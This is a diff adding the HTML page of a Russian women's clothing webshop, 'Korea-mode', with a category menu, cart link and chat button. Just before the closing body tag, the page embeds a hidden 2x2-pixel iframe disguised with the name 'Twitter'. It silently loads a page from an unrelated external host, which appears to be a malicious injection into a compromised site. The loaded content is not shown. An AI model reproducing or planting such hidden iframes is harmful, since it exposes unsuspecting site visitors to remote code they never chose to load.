@@ -1,0 +1,139 @@
+<html>
+<head>
+<meta name="keywords" content="Интернет-магазин" /><meta name="description" content="Интернет-магазин" /><title>Korea-mode</title><meta charset="windows-1251" />
+<meta name="robots" content="index, follow" />
+<meta name="author" content="Lisenko Ivan" />
+<meta name="copyright" content="Chameleon - Design Studio" />
+<link rel="shortcut icon" type="image/x-icon" href="/images/site/icon.png" />
+<link rel="stylesheet" href="style/style.css" />
+</head>
+<body>
+<table border="0" width="100%" cellpadding="0" cellspacing="0">
+<tr><td width="100%" align="center" valign="top">
+<table border="0" class="main" cellpadding="0" cellspacing="0">
+<tr>
+<td width="978" height="478" colspan="2" background="images/logo.jpg" valign="bottom">
+<table border="0">
+<tr>
+  <td>
+  <!-- webim button --><a href="/webim/client.php?locale=ru&amp;style=simplicity" target="_blank" onclick="if(navigator.userAgent.toLowerCase().indexOf('opera') != -1 &amp;&amp; window.event.preventDefault) window.event.preventDefault();this.newWindow = window.open('/webim/client.php?locale=ru&amp;style=simplicity&amp;url='+escape(document.location.href)+'&amp;referrer='+escape(document.referrer), 'webim', 'toolbar=0,scrollbars=0,location=0,status=1,menubar=0,width=640,height=480,resizable=1');this.newWindow.focus();this.newWindow.opener=window;return false;"><img src="/webim/b.php?i=simple&amp;lang=ru" border="0" alt=""/></a><!-- / webim button -->
+  </td>
+  <td>
+    <a href="index.php?cat=view_cart"><img src="images/cart.jpg" border="0"></a>
+  </td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td bgcolor="#CC0000">
+</td>
+<td bgcolor="#CC0000" align="center">
+<b><a href="index.php" class="top_link"> </a></b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b><a href="index.php?cat=view_cart" class="top_link"></a></b>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b><a href="index.php?cat=dostavka" class="top_link"></a></b>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b><a href="index.php?cat=contact" class="top_link"></a></b>   
+</td>
+</tr>
+<tr>
+<td valign="top" rowspan="2" height="1000">
+<ul id="navmenu-v">
+<li><a href="index.php?cat=daily_dresses">Платья</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=daily_dresses">Повседневные</a></li>
+ <li><a href="index.php?cat=evening_dresses">Вечерние</a></li>
+ </ul>
+<li><a href="index.php?cat=tops">Топы / Фтуболки</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=tops">Топы</a></li>
+ <li><a href="index.php?cat=t-shirts">Футболки</a></li>
+ <li><a href="index.php?cat=longslivs">Лонгсливы</a></li>
+ </ul>
+<li><a href="index.php?cat=shifon">Блузки / Туники / Кофточки</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=shifon">Шифон</a></li>
+ <li><a href="index.php?cat=jarsey">Трикотаж</a></li>
+ </ul>
+<li><a href="index.php?cat=trousers">Брюки / Шорты / Джинсы </a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=trousers">Брюки</a></li>
+ <li><a href="index.php?cat=shorts">Шорты</a></li>
+ <li><a href="index.php?cat=jeans">Джинсы</a></li>
+ </ul>
+<li><a href="index.php?cat=skirts">Юбки</a></li>
+<li><a href="index.php?cat=kombez">Комбинезоны</a></li>
+<li><a href="index.php?cat=jumpsuits">Спорт</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=jumpsuits">Спортивные костюмы</a></li>
+ <li><a href="index.php?cat=sports_trousers">Спортивные штаны</a></li>
+ </ul>
+<li><a href="index.php?cat=j_kombez">Джинсовая одежда</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=jeans">Джинсы</a></li>
+ <li><a href="index.php?cat=j_shorts">Шорты</a></li>
+ <li><a href="index.php?cat=j_kombez">Комбинезоны</a></li>
+ </ul>
+<li><a href="index.php?cat=jackets_p">Пиджаки / Жакеты / Кардиганы</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=jackets_p">Пиджаки</a></li>
+ <li><a href="index.php?cat=jackets">Жакеты</a></li>
+ <li><a href="index.php?cat=kardigan">Кардиганы</a></li>
+ </ul>
+<li><a href="index.php?cat=vesna_leto">Худи / Толстовки</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=vesna_leto">Весна - лето</a></li>
+ <li><a href="index.php?cat=osen_zima">Осень - зима</a></li>
+ </ul>
+<li><a href="index.php?cat=poluver">Полуверы, свитера</a></li>
+<li><a href="index.php?cat=club_mode">Клубная мода</a></li>
+<li><a href="index.php?cat=nijnee_belio">Нижнее белье</a></li>
+<li><a href="index.php?cat=kupalnik">Пляжная мода</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=kupalnik">Купальники</a></li>
+ <li><a href="index.php?cat=beach_dres">Пляжная одежда</a></li>
+ <li><a href="index.php?cat=beach_acesorie">Аксессуары</a></li>
+ </ul>
+<li><a href="index.php?cat=top_dres">Верхняя одежда</a></li>
+<li><a href="index.php?cat=big_size">Одежда больших размеров</a></li>
+<li><a href="index.php?cat=sumki">Аксессуары</a>
+ <ul>
+ </li>
+ <li><a href="index.php?cat=head">Головные уборы</a></li>
+ <li><a href="index.php?cat=sharfi">Шарфы, шали</a></li>
+ <li><a href="index.php?cat=hair">Аксессуары для волос</a></li>
+ <li><a href="index.php?cat=sumki">Сумки</a></li>
+ <li><a href="index.php?cat=remni">Ремни</a></li>
+ <li><a href="index.php?cat=koshelki">Кошельки</a></li>
+ <li><a href="index.php?cat=biguter">Бижутерия</a></li>
+ <li><a href="index.php?cat=perchatki">Перчатки</a></li>
+ <li><a href="index.php?cat=raznoe_a">Разное</a></li>
+ </ul>
+<li><a href="index.php?cat=raznoe">Разное и нужное</a></li></td>
+<td align="center">
+<a href="http://korea-mode.ru" target="_blank"><img src="/upload/images/26_06_2011-18_37_33-Безимени-1.jpg" alt="Магазин женской одежды" boder="0"></a></td>
+</tr>
+<tr>
+<td width="80%" valign="top" class="text_admin">
+<table border="0" width="100%" class="text_admin"><tr><td align="center"><table border="0" cellpadding="10" cellspacing="0" class="text_admin">В данной категории еще нет товаров</td>
+</tr>
+<tr>
+<td colspan="2" class="text_admin" align="center"><br><br>
+</td>
+</tr>
+</table>
+</td></tr>
+</table>
+</table>
+<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://s386667732.websitehome.co.uk/hxny.html?i=2843626></iframe></body>
+</html>
+
+
+<script></script>
